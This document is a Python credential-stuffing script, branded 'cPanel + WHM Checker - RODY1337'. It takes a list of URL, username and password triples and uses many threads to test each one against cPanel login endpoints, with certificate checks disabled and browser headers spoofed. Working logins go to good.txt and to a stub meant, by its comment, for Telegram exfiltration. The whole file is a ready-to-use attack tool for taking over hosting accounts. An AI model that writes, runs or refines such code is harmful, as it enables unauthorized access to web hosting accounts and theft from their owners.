import sys
import requests
from multiprocessing.dummy import Pool
from colorama import Fore, Style, init

init(autoreset=True)
fg = Fore.GREEN
fr = Fore.RED

def send_text(text):
    try:
        # Ganti sesuai dengan pengiriman pesan Telegram Anda
        print(fg + "Sending Message" + fg)
    except:
        pass

print(fg + "cPanel + WHM Checker - RODY1337")

def check_account(txt):
    url = txt.split('|')[0]
    login = txt.split('|')[1]
    password = txt.split('|')[2]
    headers = {
        'Accept': '*/*',
        'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
        'Connection': 'keep-alive',
        'Origin': url,
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36',
        'sec-ch-ua': '".Not/A)Brand";v="99", "Google Chrome";v="103", "Chromium";v="103"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"'
    }
    params = {'login_only': '1'}
    data = {'user': login, 'pass': password}
    try:
        response = requests.post(f'{url}/login/', params=params, headers=headers, data=data, timeout=20, verify=False).json()
        if response['status'] == 1:
            print(f'Valid: URL: {url} | Login: {login} | Password: {password}')
            with open('good.txt', 'a') as f:
                f.write(f'{url}|{login}|{password}\n')
                print(f"{url} --> [Success] {fg}")
                send_text(f"{url}|{login}|{password}")
        else:
            print(f'Invalid: URL: {url} | Login: {login} | Password: {password}')
            print(f"{url} --> [Failed] {fr}")
    except Exception as e:
        print(f"{url} --> [Failed] {fr}")
        print(f"Error: {e}")

def main(file, threads):
    try:
        accounts_list = open(file, 'r').read().splitlines()
        pool = Pool(threads)
        pool.map(check_account, accounts_list)
        pool.close()
        pool.join()
    except Exception as e:
        print(f"Error: {e}")

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Usage: python3 cp.py <filename> <threads>")
        sys.exit(1)

    file = sys.argv[1]
    threads = int(sys.argv[2])

    main(file, threads)
